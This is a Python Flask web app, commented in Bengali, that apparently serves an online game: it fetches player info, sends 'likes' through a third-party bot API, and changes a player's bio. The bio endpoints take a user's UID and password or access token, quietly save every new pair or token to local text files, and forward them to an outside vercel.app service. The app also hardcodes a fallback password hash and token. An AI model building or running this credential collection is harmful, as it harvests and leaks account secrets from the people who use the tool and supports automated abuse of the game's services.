from flask import Flask, render_template, request, jsonify
import requests
import os
import traceback

app = Flask(__name__)

# ফাইল পাথ কনফিগারেশন
TOKEN_FILE = 'tokens.txt'
UID_FILE = 'uids.txt'

# ফাইলগুলো তৈরি না থাকলে তৈরি করে নেওয়া
for file in [TOKEN_FILE, UID_FILE]:
    if not os.path.exists(file):
        with open(file, 'w') as f:
            pass

@app.route('/')
def index():
    return render_template('index.html')
    
@app.route('/login')
def login():
    return render_template('login.html')    

@app.route('/get_info', methods=['POST'])
def get_info():
    data = request.get_json() or {}
    uid = data.get('uid')
    if not uid:
        return jsonify({'error': 'UID দিতে হবে!'}), 400
    try:
        response = requests.get("https://info.killersharmabot.online/player-info", params={'uid': uid}, timeout=10)
        if response.status_code == 200:
            return jsonify(response.json())
        else:
            return jsonify({'error': 'তথ্য পাওয়া যায়নি', 'status': response.status_code}), response.status_code
    except Exception as e:
        print(traceback.format_exc()) # টার্মিনালে আসল এরর দেখার জন্য
        return jsonify({'error': 'সার্ভার ডাউন বা এপিআই রেসপন্স এরর'}), 500

@app.route('/send_like', methods=['POST'])
def send_like():
    data = request.get_json() or {}
    uid = data.get('uid')
    server = data.get('server', 'bd')
    if not uid:
        return jsonify({'error': 'UID দিতে হবে!'}), 400
    try:
        response = requests.get("https://like-api-yasin.vercel.app/like", params={'uid': uid, 'server_name': server}, timeout=15)
        if response.status_code == 200:
            return jsonify(response.json())
        else:
            return jsonify({'error': 'লাইক পাঠানো যায়নি', 'status': response.status_code}), response.status_code
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'error': 'কানেকশন এরর'}), 500

# মেথড ১: UID + Pass (ডুপ্লিকেট প্রোটেকশনসহ সেভ)
@app.route('/change_bio_pass', methods=['POST'])
def change_bio_pass():
    data = request.get_json() or {}
    uid = data.get('uid', '').strip()
    bio_text = data.get('bio')
    password = data.get('pass', '').strip() if data.get('pass') else '201BAC5B55C11367E782423F6DFCB98484B2DDA0A669369255020644C6CCDCFB'
    
    if not uid or not bio_text:
        return jsonify({'error': 'UID এবং Bio দিতে হবে!'}), 400
        
    # ডুপ্লিকেট UID চেক করা
    is_duplicate = False
    if os.path.exists(UID_FILE):
        with open(UID_FILE, 'r') as f:
            lines = f.readlines()
            for line in lines:
                if line.strip().startswith(f"{uid}:"):
                    is_duplicate = True
                    break
                    
    # নতুন হলে ফাইলে সেভ করা
    if not is_duplicate:
        with open(UID_FILE, 'a') as f:
            f.write(f"{uid}:{password}\n")

    try:
        response = requests.get("https://ob54-asd-long-bio.vercel.app/bio", params={'bio': bio_text, 'uid': uid, 'pass': password}, timeout=15)
        try: 
            return jsonify(response.json())
        except: 
            return jsonify({'status': response.status_code, 'message': response.text}), response.status_code
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'error': 'Bio API ১ এরর'}), 500

# /change_bio_access এন্ডপয়েন্ট আপডেট (ডুপ্লিকেট টোকেন প্রোটেকশনসহ সেভ)
@app.route('/change_bio_access', methods=['POST'])
def change_bio_access():
    data = request.get_json() or {}
    bio_text = data.get('bio')
    access_token = data.get('access', '').strip() if data.get('access') else 'd8f9fed568d97147859de206a07e342e7736ce6e9b89c9020e6d99864c4f9ebc'
    
    if not bio_text:
        return jsonify({'error': 'Bio টেক্সট খালি রাখা যাবে না!'}), 400
        
    # ডুপ্লিকেট টোকেন চেক করা
    is_duplicate = False
    if os.path.exists(TOKEN_FILE):
        with open(TOKEN_FILE, 'r') as f:
            tokens = f.read().splitlines()
            if access_token in tokens:
                is_duplicate = True
                
    # নতুন টোকেন হলে ফাইলে সেভ করা
    if not is_duplicate:
        with open(TOKEN_FILE, 'a') as f:
            f.write(f"{access_token}\n")

    try:
        payload = {'bio': bio_text, 'access': access_token, 'token': access_token, 'access_token': access_token}
        response = requests.get("https://ob54-asd-long-bio.vercel.app/bio", params=payload, timeout=15)
        try: 
            return jsonify(response.json())
        except: 
            return jsonify({'status': response.status_code, 'message': response.text}), response.status_code
    except Exception as e:
        print(traceback.format_exc())
        return jsonify({'error': 'Bio API ২ এরর'}), 500

if __name__ == '__main__':
    app.run(debug=True, port=5000)
